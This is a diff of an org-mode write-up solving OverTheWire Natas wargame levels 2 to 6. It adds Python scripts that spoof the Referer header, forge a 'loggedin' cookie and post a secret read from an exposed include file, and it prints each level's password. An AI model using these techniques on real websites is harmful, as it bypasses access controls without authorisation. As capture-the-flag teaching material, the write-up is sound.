@@ -26,7 +26,7 @@ curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto  "http://natas1.natas.labs.overt
 : <!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
 
 ** Level 2
-Again view the source page. There is a line that link to an image scr{<img src="files/pixel.png">}
+Again view the source page. There is a line with a link to an image 
 
 #+BEGIN_SRC 
 <img src="files/pixel.png">
@@ -70,7 +70,29 @@ only from "http://natas5.natas.labs.overthewire.org/"
 #+END_SRC
 It is possible to simulate this by setting the referer in the header of the get
 request to the natas5 website.
-#+BEGIN_SRC python
+
+First define a function that can find the password in the raw html text:
+
+#+NAME: 373e98c9-ce75-4f43-921a-289dfacae023
+#+BEGIN_SRC ein-python :session :async :results output 
+
+def find_pswd(text):
+    # find the line with the password in the html text
+    lines = text.split('\n')
+    bools = list(map(lambda x : "password" in x, lines))
+    for (b,line) in zip(bools,lines):
+        if b:
+            return line
+
+#+END_SRC
+
+#+RESULTS: 373e98c9-ce75-4f43-921a-289dfacae023
+
+Now the code that change the referer to natas5:
+
+#+NAME: c24a72b1-d2b5-4377-8762-815c67a7d6cd
+#+BEGIN_SRC ein-python :session :async :results output 
+# The code is written in python
 import requests
 from requests.auth import HTTPBasicAuth
 
@@ -82,15 +104,84 @@ headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
 # get request with the referer set to natas5
 r = requests.get(url, headers=headers, auth=HTTPBasicAuth(user,pswd))
 
-# find the line with the password in it
-lines = r.text.split('\n')
-bools = list(map(lambda x : "password" in x, lines))
-for (b,line) in zip(bools,lines):
-    if b:
-        return line
+print(find_pswd(r.text))
 #+END_SRC
 
-#+RESULTS:
+#+RESULTS: c24a72b1-d2b5-4377-8762-815c67a7d6cd
 : Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
 ** Level 5
+After logging in the web page shows:
+
+#+BEGIN_SRC 
+Access disallowed. You are not logged in
+#+END_SRC
+
+Lets inspect the headers to see what is happening
+
+#+NAME: 575ee3fe-cc0f-4b76-bf91-927f3fe97c0c
+#+BEGIN_SRC ein-python :session :async :results output
+# The code is written in python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user = "natas5"
+pswd = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
+url = "http://natas5.natas.labs.overthewire.org/"
+
+r = requests.get(url, auth=HTTPBasicAuth(user,pswd))
+print(r.headers)
+
+#+END_SRC
+
+#+RESULTS: 575ee3fe-cc0f-4b76-bf91-927f3fe97c0c
+: {'Date': 'Sat, 05 Mar 2022 10:28:27 GMT', 'Server': 'Apache/2.4.10 (Debian)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '367', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
+
+The output show that the the Set-cookie loggedin=0, if that is changed to 
+loggedin=1 then that should give access to the password.
+
+#+NAME: 35846085-d24d-4f0a-beb1-6538bb4b9471
+#+BEGIN_SRC ein-python :session :async :results output
+
+cookies = {'loggedin': '1'}
+
+# get request with the cookie set loggedin=1
+r = requests.get(url, cookies=cookies, auth=HTTPBasicAuth(user,pswd))
+
+# find the line with the password in it
+print(find_pswd(r.text))
+
+#+END_SRC
+
+#+RESULTS: 35846085-d24d-4f0a-beb1-6538bb4b9471
+: Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+
+** Level 6
+After logging in we are prompted to input a secret. The source contains the line:
+#+BEGIN_SRC 
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+#+END_SRC
+Then going to the url view-source:http://natas6.natas.labs.overthewire.org/index-source.html contains:
+#+BEGIN_SRC 
+include "includes/secret.inc";
+#+END_SRC
+follow this to the url http://natas6.natas.labs.overthewire.org/includes/secret.inc, which reveals the secret: "FOEIUWGHFEEUHOFUOIU"
+
+#+NAME: 357e147d-fa57-479d-bffb-c2131c2736b1
+#+BEGIN_SRC ein-python :session :async :results output
+
+user = "natas6"
+pswd = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
+url = "http://natas6.natas.labs.overthewire.org/"
+post_data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}
+
+# get request with the referer set to natas5
+r = requests.post(url, auth=HTTPBasicAuth(user,pswd), data=post_data)
+
+print(find_pswd(r.text))
+
+#+END_SRC
+
+#+RESULTS: 357e147d-fa57-479d-bffb-c2131c2736b1
+: Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
